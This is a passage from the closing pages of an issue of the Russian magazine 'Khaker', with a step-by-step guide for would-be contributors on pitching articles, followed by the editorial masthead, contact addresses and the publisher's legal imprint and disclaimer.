   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №3 (300)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                      Ев гения Шарипова           yambuto
                        Литературный редактор         Бильд-редак тор
                                                   yambuto@gmail.com


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Учредитель: ИП Яков лева Анна Вадимов на ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Москов ская область,
Пушкино, мкр Соф рино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегис трирова но Федераль ной службой по надзору в сфере связи,
информа цион ных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обя зательно совпадает с мнением авторов. Все матери алы в номере предоставля ются как информа ция к раз мышлению. Лица,
использующие данную информа цию в про тиво законных целях, могут быть прив лечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024